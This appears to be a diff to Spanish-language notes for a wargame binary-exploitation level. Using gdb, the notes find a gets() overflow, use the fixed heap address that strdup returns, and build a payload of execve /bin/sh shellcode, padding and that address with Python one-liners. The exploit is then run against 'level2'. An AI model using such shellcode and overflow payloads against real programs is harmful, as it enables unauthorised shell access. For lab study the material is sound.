@@ -6,12 +6,14 @@
   0x0804853f  main
   [...]
 3.- Vemos que main lo único que hace es una llamada a la función p()
-   0x0804853f <+0>:	push   ebp
-   0x08048540 <+1>:	mov    ebp,esp
-   0x08048542 <+3>:	and    esp,0xfffffff0
-   0x08048545 <+6>:	call   0x80484d4 <p>
-   0x0804854a <+11>:	leave
-   0x0804854b <+12>:	ret
+  [...]
+    0x0804853f <+0>:	push   ebp
+    0x08048540 <+1>:	mov    ebp,esp
+    0x08048542 <+3>:	and    esp,0xfffffff0
+    0x08048545 <+6>:	call   0x80484d4 <p>
+    0x0804854a <+11>:	leave
+    0x0804854b <+12>:	ret
+  [...]
 4.- Desensamblamos p
 5.- Vemos que hay una llamada a gets() que sabemos que es vulnerable
   [...]
@@ -33,6 +35,7 @@
     (gdb) info proc mapping
     [...]
    	  0xbffdf000 0xc0000000    0x21000        0x0 [stack] 
+    [...]
    	Corresponde a este builtin de c:
    	  __builtin_return_address(0);
 9.- Todo esto sucede porque el binarion está compilado como no-pie lo que hará que las direcciónes 
@@ -43,27 +46,53 @@
   [...]
 11.- Esta fúncion usa malloc para albergar una cadena el el heap.
 12.- Podemos usar el heap para insertar un shellcode y hacer el overflow en el gets para que la 
-    return adress apunte a la dirección de retorno de strdup ya que siempre va a ser la misma
-  (gdb)b strdup
-  (gdb)run
-  (gdb)n
-  (gdb)n
+    return adress apunte a la dirección que retorna el strdup ya que siempre va a ser la misma
+    y la proteción no tiene efecto ya que es una dirección que empieza por 
   [...]
-    0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+    (gdb)b strdup
+    (gdb)run
+    (gdb)n
+  [...]
+       0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
     => 0x0804853d <+105>:	leave
   [...]
-  (gdb)x $eax
-  0x804a008:	0x00004343
+    (gdb)x $eax
+    0x804a008:	0x00004343
   [...]
-13.- Calculamos la longitud del payload
+13.-
+  [...]
+  puts <- payload
+  [...]
+  strdup -> heap adress
+  [...]
+
+  High adr
+  ---------------
+  | shellcode   | <-
+  ---------------   |
+  | HEAP        |   |
+  ---------------   |
+                    | 
+  ---------------   |
+  | STACK       |   |
+  ---------------   |
+  | eip         | --|
+  ---------------
+  | ebp         |
+  ---------------
+  | [...]       |
+  ---------------
+  | esp         |
+  ---------------
+  low adr
+
+14.- Calculamos la longitud del payload
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
-14.- Ahora necesitamos un shellcode que nos de una shell
+15.- Ahora necesitamos un shellcode que nos de una shell
   https://shell-storm.org/shellcode/files/shellcode-575.html
-15.- Montamos el payload y se lo pasamos a un archivo
-  python 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + 59 * "A" + "\x08\xa0\x04\x08"' > payload
+16.- Montamos el payload y se lo pasamos a un archivo
+  python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + 59 * "A" + "\x08\xa0\x04\x08"' > payload
   python3:
   python -c 'import sys; sys.stdout.buffer.write(b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + b"A" * 59 + b"\x08\xa0\x04\x08")' > payload
-16.- Lo subimos a la máquina y lo ejecutamos
-
-
+17.- Lo subimos a la máquina y lo ejecutamos con cat payload - | level2
 
